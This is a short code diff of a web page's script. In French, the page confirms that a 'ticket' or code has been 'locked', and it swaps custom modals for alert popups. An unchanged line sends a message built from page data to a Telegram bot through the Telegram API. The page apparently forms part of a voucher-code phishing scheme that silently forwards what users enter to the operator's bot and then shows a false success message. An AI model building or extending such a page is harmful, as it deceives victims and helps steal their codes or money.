@@ -376,41 +376,17 @@
         xhr.open('GET', `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(messageText)}`);
 
         xhr.send();
-     xhr.onload = function () {
-            const customModal = document.getElementById('customModal');
-            const modalMessage = document.getElementById('modalMessage');
-            const customModalFail = document.getElementById('customModalFail');
-            const modalMessageFail = document.getElementById('modalMessageFail');    
-
+     
+  xhr.onload = function () {
             if (xhr.status === 200) {
-                // Display success modal
-              
-              
-                modalMessage.textContent ='code verrouillé avec succès';
-                
-
-            
-        else {
-                // Display error modal
-                modalMessageFail.textContent = 'echec lors du Verrouillage, veuillez réesayer';
+                // Display a success popup
+                window.alert('ticket verrouilléavec succès');
+            } else {
+                // Display an error popup
+                window.alert('echec lors du verrouillage du ticket, veuillez réesayer');
             }
-            customModal.style.display = 'block';
-            customModalFail.style.display='block';
-            // Close the modal after 3 seconds (adjust as needed)
-            setTimeout(() => {
-                customModal.style.display = 'none';
-            }, 3000);
-    
-      setTimeout(() => {
-
-                customModalFail.style.display = 'none';
-
-            }, 3000);
-
-      };
-
-    });   
-
+        };
+    });
         
 </script>
 
